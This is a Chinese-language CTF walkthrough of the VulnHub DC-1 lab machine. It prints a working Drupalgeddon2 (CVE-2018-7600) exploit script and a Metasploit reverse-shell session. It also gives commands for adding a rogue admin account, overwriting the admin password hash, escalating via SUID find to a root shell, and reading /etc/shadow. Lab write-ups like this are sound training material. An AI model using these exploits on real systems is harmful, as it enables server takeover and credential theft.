vulnhub-DC-1

使用Nmap探测靶机IP

nmap -sn 192.168.93.0/24

扫描得到靶机IP为 192.168.93.5

使用Nmap进行全端口扫描

nmap -sS -Pn -p 0-65535 -sV -T4 -O 192.168.93.5

靶机开放 80 端口，浏览器访问 http://192.168.93.5

目标是使用Drupal搭建的网站

通过wappalyzer插件进行指纹识别和查看数据包中响应头信息可以知道使用的是 Drupal 7

通过查找 Drupal 历史漏洞，发现可能存在RCE漏洞（CVE-2018-7600）

利用 https://github.com/FireFart/CVE-2018-7600 该POC进行测试

#!/usr/bin/env python3

"""
Written by Christian Mehlmauer
  https://firefart.at/
  https://twitter.com/_FireFart_
  https://github.com/FireFart
This script can be obtained from:
  https://github.com/FireFart/CVE-2018-7600
Requirements:
  - python3
  - python requests (pip install requests)
Usage:
  - Install dependencies
  - modify the HOST variable in the script
  - run the code
  - win
"""

import requests
import re

HOST="http://192.168.93.5/"

get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'id', 'name[#type]':'markup'}
post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
r = requests.post(HOST, data=post_params, params=get_params)

m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
if m:
    found = m.group(1)
    get_params = {'q':'file/ajax/name/#value/' + found}
    post_params = {'form_build_id':found}
    r = requests.post(HOST, data=post_params, params=get_params)
    print(r.text)

可以成功执行命令

利用MSF来执行攻击，使用 exploit/unix/webapp/drupal_drupalgeddon2 模块

msf5 > use exploit/unix/webapp/drupal_drupalgeddon2
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set rhosts 192.168.93.5
rhosts => 192.168.93.5
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 192.168.93.4:4444 
[*] Sending stage (38288 bytes) to 192.168.93.5
[*] Meterpreter session 1 opened (192.168.93.4:4444 -> 192.168.93.5:36275) at 2021-01-23 06:38:30 -0500

meterpreter >

攻击成功，获得一个 meterpreter 会话

查看目录文件，发现 flag1.txt 文件，查看该文件内容

根据提示信息，查看站点配置文件，Drupal默认配置文件 sites/default/settings.php

查看到数据库账号密码，根据提示，登录数据库

执行shell命令切换到shell环境下，再使用Python获取一个交互式的shell

python -c 'import pty;pty.spawn("/bin/bash")'

使用 mysql -udbuser -p 密码 R0ck3t 登录数据库

查看网站管理员用户信息

密码Hash无法解密，使用针对 Drupal 7 版本(<=7.31)的攻击脚本增加一个 admin 权限的用户

python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.93.5 -u admin1 -p admin1

账号添加成功

还可以采用替换管理员密码Hash的方式，使用加密脚本 scripts/password-hash.sh 生成新的密码Hash

在MySQL中执行SQL语句替换掉旧的密码Hash

update users set pass='$S$Dx/5adlWsrP7H4veXtT99YHtQzTqBzvNUVbm1tsIu6W.k6cDJN7O' where uid=1;

使用账号密码登录，在Content中拿到flag3

根据提示利用 suid 提权，再查看 /etc/shadow 文件

查找具有root权限的suid的文件

find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;

利用find命令获取到root权限的shell

find . -exec /bin/sh \; -quit

查看 /etc/shadow 文件，发现存在 flag4 用户

查看 /home/flag4/flag4.txt 文件获取flag4

搜索所有txt文件，发现 /root/thefinalflag.txt

find / -name "*.txt"

查看文件内容得到最后的flag
